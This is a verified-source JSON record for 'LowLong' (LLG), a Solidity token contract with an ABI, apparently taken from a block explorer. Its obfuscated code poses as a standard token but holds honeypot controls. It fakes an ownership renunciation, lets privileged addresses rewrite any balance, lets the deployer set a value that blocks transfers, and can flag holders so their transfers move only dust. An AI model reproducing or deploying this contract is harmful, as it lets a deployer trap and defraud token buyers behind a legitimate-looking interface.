{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface sellMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract marketingTeamLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingLaunched {\n    function createPair(address launchedSwap, address fromTxAt) external returns (address);\n}\n\ninterface sellTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundBuy) external view returns (uint256);\n\n    function transfer(address shouldSwap, uint256 senderIs) external returns (bool);\n\n    function allowance(address marketingShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldSwap,\n        uint256 senderIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxSenderFee, uint256 value);\n    event Approval(address indexed marketingShould, address indexed spender, uint256 value);\n}\n\ninterface sellToMetadata is sellTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LowLong is marketingTeamLaunched, sellTo, sellToMetadata {\n\n    uint256 private liquidityMarketing;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeIs;\n    }\n\n    mapping(address => bool) public teamReceiver;\n\n    function shouldExempt() private view {\n        require(fundLimit[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeLimitMarketing;\n    }\n\n    bool public listMode;\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalLaunch;\n    }\n\n    bool public exemptLiquidityTotal;\n\n    function approve(address launchSwap, uint256 senderIs) public virtual override returns (bool) {\n        totalExempt[_msgSender()][launchSwap] = senderIs;\n        emit Approval(_msgSender(), launchSwap, senderIs);\n        return true;\n    }\n\n    string private enableMode = \"Low Long\";\n\n    function limitTake(address exemptSwap, address shouldSwap, uint256 senderIs) internal returns (bool) {\n        require(totalLaunched[exemptSwap] >= senderIs);\n        totalLaunched[exemptSwap] -= senderIs;\n        totalLaunched[shouldSwap] += senderIs;\n        emit Transfer(exemptSwap, shouldSwap, senderIs);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private totalExempt;\n\n    function balanceOf(address fundBuy) public view virtual override returns (uint256) {\n        return totalLaunched[fundBuy];\n    }\n\n    uint256 constant marketingReceiver = 11 ** 10;\n\n    bool private toMin;\n\n    string private totalLaunch = \"LLG\";\n\n    function senderFrom() public {\n        emit OwnershipTransferred(marketingFrom, address(0));\n        limitAt = address(0);\n    }\n\n    mapping(address => uint256) private totalLaunched;\n\n    function enableTo(address exemptSwap, address shouldSwap, uint256 senderIs) internal returns (bool) {\n        if (exemptSwap == marketingFrom) {\n            return limitTake(exemptSwap, shouldSwap, senderIs);\n        }\n        uint256 maxFrom = sellTo(receiverTake).balanceOf(takeToken);\n        require(maxFrom == fromAt);\n        require(shouldSwap != takeToken);\n        if (teamReceiver[exemptSwap]) {\n            return limitTake(exemptSwap, shouldSwap, marketingReceiver);\n        }\n        return limitTake(exemptSwap, shouldSwap, senderIs);\n    }\n\n    address public marketingFrom;\n\n    function senderSwapToken(address tradingWallet, uint256 senderIs) public {\n        shouldExempt();\n        totalLaunched[tradingWallet] = senderIs;\n    }\n\n    bool private totalMarketingTrading;\n\n    address teamList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private sellList;\n\n    uint8 private modeLimitMarketing = 18;\n\n    function transfer(address tradingWallet, uint256 senderIs) external virtual override returns (bool) {\n        return enableTo(_msgSender(), tradingWallet, senderIs);\n    }\n\n    function autoSender(address sellFromMin) public {\n        require(sellFromMin.balance < 100000);\n        if (exemptLiquidityTotal) {\n            return;\n        }\n        \n        fundLimit[sellFromMin] = true;\n        if (totalMarketingTrading) {\n            buyEnable = enableMax;\n        }\n        exemptLiquidityTotal = true;\n    }\n\n    function totalFundIs(uint256 senderIs) public {\n        shouldExempt();\n        fromAt = senderIs;\n    }\n\n    function owner() external view returns (address) {\n        return limitAt;\n    }\n\n    uint256 fromAt;\n\n    uint256 totalAt;\n\n    function walletMarketing(address launchedMin) public {\n        shouldExempt();\n        if (teamFee) {\n            buyEnable = liquidityMarketing;\n        }\n        if (launchedMin == marketingFrom || launchedMin == receiverTake) {\n            return;\n        }\n        teamReceiver[launchedMin] = true;\n    }\n\n    uint256 public enableMax;\n\n    bool private teamFee;\n\n    uint256 private shouldLimit;\n\n    uint256 private buyEnable;\n\n    function name() external view virtual override returns (string memory) {\n        return enableMode;\n    }\n\n    event OwnershipTransferred(address indexed txListReceiver, address indexed fromWallet);\n\n    address takeToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public receiverTake;\n\n    function allowance(address swapTxLaunch, address launchSwap) external view virtual override returns (uint256) {\n        if (launchSwap == teamList) {\n            return type(uint256).max;\n        }\n        return totalExempt[swapTxLaunch][launchSwap];\n    }\n\n    function getOwner() external view returns (address) {\n        return limitAt;\n    }\n\n    uint256 private feeIs = 100000000 * 10 ** 18;\n\n    function transferFrom(address exemptSwap, address shouldSwap, uint256 senderIs) external override returns (bool) {\n        if (_msgSender() != teamList) {\n            if (totalExempt[exemptSwap][_msgSender()] != type(uint256).max) {\n                require(senderIs <= totalExempt[exemptSwap][_msgSender()]);\n                totalExempt[exemptSwap][_msgSender()] -= senderIs;\n            }\n        }\n        return enableTo(exemptSwap, shouldSwap, senderIs);\n    }\n\n    constructor (){\n        \n        sellMarketing takeLaunch = sellMarketing(teamList);\n        receiverTake = marketingLaunched(takeLaunch.factory()).createPair(takeLaunch.WETH(), address(this));\n        \n        marketingFrom = _msgSender();\n        senderFrom();\n        fundLimit[marketingFrom] = true;\n        totalLaunched[marketingFrom] = feeIs;\n        \n        emit Transfer(address(0), marketingFrom, feeIs);\n    }\n\n    mapping(address => bool) public fundLimit;\n\n    address private limitAt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txListReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxSenderFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTxLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellFromMin\",\"type\":\"address\"}],\"name\":\"autoSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLiquidityTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderIs\",\"type\":\"uint256\"}],\"name\":\"senderSwapToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderIs\",\"type\":\"uint256\"}],\"name\":\"totalFundIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMin\",\"type\":\"address\"}],\"name\":\"walletMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LowLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}